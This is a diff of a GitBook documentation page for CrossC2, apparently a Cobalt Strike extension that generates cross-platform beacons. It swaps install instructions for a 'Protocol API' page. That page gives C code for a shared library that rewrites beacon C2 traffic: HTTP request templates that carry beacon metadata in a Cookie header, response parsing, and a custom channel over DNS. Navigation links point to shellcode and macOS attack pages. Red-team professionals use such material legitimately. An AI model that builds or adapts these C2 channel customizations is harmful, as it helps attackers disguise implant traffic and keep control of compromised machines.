@@ -4,7 +4,7 @@
     <head>
         <meta charset="UTF-8">
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
-        <title>Install · GitBook</title>
+        <title>Protocol API · GitBook</title>
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="description" content="">
         <meta name="generator" content="GitBook 3.2.3">
@@ -57,10 +57,10 @@
     <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">
 
     
-    <link rel="next" href="../usage/" />
+    <link rel="next" href="../redteam/README.md" />
     
     
-    <link rel="prev" href="../" />
+    <link rel="prev" href="../api/example_demo.html" />
     
 
     </head>
@@ -102,9 +102,9 @@
             
         </li>
     
-        <li class="chapter active" data-level="1.2" data-path="./">
+        <li class="chapter " data-level="1.2" data-path="../install/">
             
-                <a href="./">
+                <a href="../install/">
             
                     
                     Install
@@ -302,9 +302,9 @@
             
         </li>
     
-        <li class="chapter " data-level="1.5" data-path="../protocol/">
+        <li class="chapter active" data-level="1.5" data-path="./">
             
-                <a href="../protocol/">
+                <a href="./">
             
                     
                     Protocol API
@@ -390,7 +390,7 @@
     <!-- Title -->
     <h1>
         <i class="fa fa-circle-o-notch fa-spin"></i>
-        <a href=".." >Install</a>
+        <a href=".." >Protocol API</a>
     </h1>
 </div>
 
@@ -405,20 +405,97 @@
     
                                 <section class="normal markdown-section">
                                 
-                                <h1 id="install">Install</h1>
-<p>Download:</p>
-<blockquote>
-<ul>
-<li><strong>CrossC2.cna</strong></li>
-<li><strong>genCrossC2</strong> <code>CS Env</code></li>
-</ul>
-</blockquote>
-<ol>
-<li>copy <strong>CrossC2.cna</strong> and <strong>genCrossC2</strong> file to <code>CobaltStrike</code>&apos;s <strong>rootdir</strong>  (Must be in the <strong>same directory</strong> )</li>
-<li>choose <code>Script Manager</code>&#xFF0C;add <code>CrossC2.cna</code> (If successfully installed, the menu bar will have an additional item <code>CrossC2</code>)</li>
-<li>Modify the <code>genCrossC2</code> path in the<code>CrossC2.cna</code> script to the <strong>real path</strong></li>
-</ol>
-<pre><code>exec(&quot;/xxx/xxx/genCrossC2&quot;... -&gt; exec(&quot;/opt/cs/genCrossC2&quot;...
+                                <h1 id="custom-communication-protocol">Custom communication protocol</h1>
+<p>CrossC2 reserves the communication protocol API, which can be specified to implement c2profile settings and custom protocols.</p>
+<h2 id="instructions">Instructions</h2>
+<p>After writing the corresponding communication protocol implementation, use gcc/clang test.c -fPIC -shared -o lib_rebind_test.so to compile and generate a dynamic library.
+When generating a beacon, the rebind_dynamic_lib option in cna or genCrossC2 specifies the dynamic library just generated <code>lib_rebind_test.so</code>, and the last generated beacon will send communication packets according to the protocol implementation in the specified dynamic library.</p>
+<h2 id="https-communication-template-modification">HTTPs communication template modification</h2>
+<p>Corresponding to the 4 setting options in <strong>C2Profile</strong></p>
+<pre><code>http-get { 
+    client(send) { metadata{} }
+    server(recv) { output{} }
+}
+http-post { 
+    client(send) { 
+        id {} 
+        output {} 
+    }
+    server(recv) { output{} }
+}
+</code></pre><pre><code>void (*cc2_rebind_http_get_send)(char *reqData, char **outputData, long long *outputData_len);
+void (*cc2_rebind_http_get_recv)(char *resData, long long resData_len, char **outputData, long long *outputData_len);
+void (*cc2_rebind_http_post_send)(char *reqData, char *beaconID, char **outputData, long long *outputData_len);
+void (*cc2_rebind_http_post_recv)(char *resData, long long resData_len, char **outputData, long long *outputData_len);
+
+cc2_rebind_http_x_send Series functions: 
+    Encapsulate the incoming base64(metadata) data and return the complete HTTP structure data
+    `*reqData` Is the data to be requested after base64(metadata field)       - C2Profile http-get { client { (metadata) } } 
+    `**outputData` Return the actual HTTP content that needs to be sent
+
+cc2_rebind_http_x_recv Series functions:
+    Parse the incoming HTTP structure data and return the base64(output) data
+    `*resData` Is the complete HTTP content returned by the server
+    `**outputData` Returns the actual content contained in the HTTP content (output field after base64 encoding)     -C2Profile http-get {server {(output)}}
+</code></pre><h2 id="communication-protocol-customization">Communication protocol customization</h2>
+<pre><code>void (*cc2_rebind_get_protocol)(char *reqData, char **outputData, long long *outputData_len);
+void (*cc2_rebind_post_protocol)(char *reqData, char *beaconID, char **outputData, long long *outputData_len);
+
+cc2_rebind_x_protocol Series functions:
+    After the incoming original data is sent to and received from the custom communication, the obtained base64(output) data is returned
+    `*resData` Is the data to be requested after base64 (metadata field / id + output field)
+    `**outputData` It is the server response data(output field) after base64
+</code></pre><h2 id="ex">Ex:</h2>
+<h3 id="https-communication-template-customization">HTTPs communication template customization:</h3>
+<pre><code>
+void cc2_rebind_http_get_send(char *reqData, char **outputData, long long *outputData_len) {
+    printf(&quot;------ custom http get send ------\n&quot;);
+    char *requestTample = &quot;GET /%s HTTP/1.1\r\n&quot;
+        &quot;Host: http.cc2.com\r\n&quot;
+        &quot;Accept: gzip, deflate\r\n&quot;
+        &quot;User-Agent: cc2_rebind_http_get_send\r\n&quot;
+        &quot;Cookie: %s\r\n&quot;
+        &quot;Connection: cc2_rebind_http_get_send\r\n\r\n&quot;;
+    char postPayload[20000];
+    sprintf(postPayload, requestTample, &quot;test&quot;, reqData);
+
+    // Write the generated HTTP data to outputData
+    *outputData_len =  strlen(postPayload);
+    *outputData = (char *)calloc(1,  *outputData_len);
+    memcpy(*outputData, postPayload, *outputData_len);
+
+    printf(&quot;-------------------------\n&quot;);
+}
+
+void cc2_rebind_http_get_recv(char *rawData, long long rawData_len, char **outputData, long long *outputData_len) {
+    printf(&quot;------ custom http get recv ------\n&quot;);
+
+    // rawData = &quot;HTTP/1.1 200 OK
+    // Date: Tue, 26 May 2020 10:12:28 GMT
+    // Server: CC2_server
+    // Content-Length: 32
+    // Connection: close
+    // Content-Type: text/html; charset=iso-8859-1
+    //
+    // XXXXZZZZXXXXAAAZZ==
+
+    char *payload = find_pay(rawData, rawData_len); // return &quot;XXXXZZZZXXXXAAAZZ==&quot;
+
+    *outputData_len = strlen(payload);
+    *outputData = (char *)calloc(1,  *outputData_len);
+    memcpy(*outputData, payload, *outputData_len);
+
+    printf(&quot;-------------------------\n&quot;);
+}
+</code></pre><h3 id="communication-protocol-customization">Communication protocol customization</h3>
+<pre><code>void cc2_rebind_get_protocol(char *reqData, char **outputData, long long *outputData_len) {
+    printf(&quot;------ custom get protocol ------\n&quot;);
+    sendDNS(&quot;127.0.0.1&quot;, 53, 1, reqData, strlen(reqData), outputData, outputData_len);
+    if (*outputData_len &gt; 0) {
+        printf(&quot;cobaltstrike cc2_server response(%d): \n&quot;, *outputData_len);
+    }
+    printf(&quot;------ custom protocol ------\n&quot;);
+}
 </code></pre>
                                 
                                 </section>
@@ -446,12 +523,12 @@
 
             
                 
-                <a href="../" class="navigation navigation-prev " aria-label="Previous page: Introduction">
+                <a href="../api/example_demo.html#keystrokes" class="navigation navigation-prev " aria-label="Previous page: keystrokes">
                     <i class="fa fa-angle-left"></i>
                 </a>
                 
                 
-                <a href="../usage/" class="navigation navigation-next " aria-label="Next page: Usage">
+                <a href="../redteam/README.md" class="navigation navigation-next " aria-label="Next page: RedTeam">
                     <i class="fa fa-angle-right"></i>
                 </a>
                 
@@ -462,7 +539,7 @@
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"Install","level":"1.2","depth":1,"next":{"title":"Usage","level":"1.3","depth":1,"path":"usage/README.md","ref":"usage/README.md","articles":[{"title":"cna","level":"1.3.1","depth":2,"path":"usage/cna.md","ref":"usage/cna.md","articles":[]},{"title":"direct run","level":"1.3.2","depth":2,"path":"usage/genCross.md","ref":"usage/genCross.md","articles":[]},{"title":"iOS","level":"1.3.3","depth":2,"path":"usage/iOS.md","ref":"usage/iOS.md","articles":[]},{"title":"Android","level":"1.3.4","depth":2,"path":"usage/android.md","ref":"usage/android.md","articles":[]}]},"previous":{"title":"Introduction","level":"1.1","depth":1,"path":"README.md","ref":"README.md","articles":[]},"dir":"ltr"},"config":{"plugins":[],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"language":"en","gitbook":"*"},"file":{"path":"install/README.md","mtime":"2020-03-29T06:25:43.231Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-05-27T06:15:38.542Z"},"basePath":"..","book":{"language":"en"}});
+            gitbook.page.hasChanged({"page":{"title":"Protocol API","level":"1.5","depth":1,"next":{"title":"RedTeam","level":"1.6","depth":1,"path":"redteam/README.md","ref":"redteam/README.md","articles":[{"title":"use shellcode","level":"1.6.1","depth":2,"path":"redteam/shellcode_call_crossc2.md","ref":"redteam/shellcode_call_crossc2.md","articles":[]},{"title":"attack MacOS","level":"1.6.2","depth":2,"path":"redteam/attack_macos.md","ref":"redteam/attack_macos.md","articles":[]}]},"previous":{"title":"keystrokes","level":"1.4.5.2","depth":3,"anchor":"#keystrokes","path":"api/example_demo.md","ref":"api/example_demo.md#keystrokes","articles":[]},"dir":"ltr"},"config":{"plugins":[],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"language":"en","gitbook":"*"},"file":{"path":"protocol/README.md","mtime":"2020-05-27T03:20:52.655Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-05-27T06:15:38.542Z"},"basePath":"..","book":{"language":"en"}});
         });
     </script>
 </div>
